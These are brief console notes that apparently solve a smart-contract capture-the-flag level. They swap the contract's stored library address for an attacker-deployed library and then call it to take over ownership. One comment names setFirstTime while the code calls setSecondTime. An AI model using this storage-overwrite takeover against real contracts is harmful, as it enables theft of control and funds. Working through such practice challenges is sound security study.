# Getting owner
await contract.owner()

# Getting library1 address
await contract.timeZone1Library()

# Deploy hack linrary LibraryContractHacked 
# Do the followings either directly or from Remix
 
# call setFirstTime with the deployed LibraryContractHacked address padded with a necessary number of starting zero
contract.setSecondTime(0x6c99f2a322f3f5cb6097052de25aff9ff341d3bc)

# check if the library1 address has been changed to the hacked addess
await contract.timeZone1Library()

# call setFirstTime with any parameter

# Getting new owner
await contract.owner()



  